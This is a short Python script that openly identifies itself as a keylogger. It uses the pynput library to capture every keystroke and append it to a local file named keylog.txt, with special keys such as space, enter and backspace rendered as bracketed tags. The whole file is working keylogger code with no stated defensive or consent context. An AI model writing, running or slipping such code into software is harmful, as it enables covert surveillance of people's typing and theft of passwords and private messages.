from pynput.keyboard import Listener  # Library for capturing keystrokes

# Specify the log file to store the keystrokes
log_file = "keylog.txt"

# Function to write keystrokes to a file
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            # Remove extra quotes around the key
            key = str(key).replace("'", "")

            # Handle special keys
            if key == "Key.space":
                file.write("[SPACE]")
            elif key == "Key.enter":
                file.write("[ENTER]\n")  # Add a newline for better formatting
            elif key == "Key.backspace":
                file.write("[BACKSPACE]")
            elif key.startswith("Key."):
                file.write(f"[{key[4:].upper()}]")  # General special key format
            else:
                file.write(key)  # Regular character keys
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function called on each key press
def on_press(key):
    write_to_file(key)

# Main function to start the keylogger
def start_keylogger():
    print("Keylogger is running... Press Ctrl+C to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

# Entry point of the script
if __name__ == "__main__":
    start_keylogger()
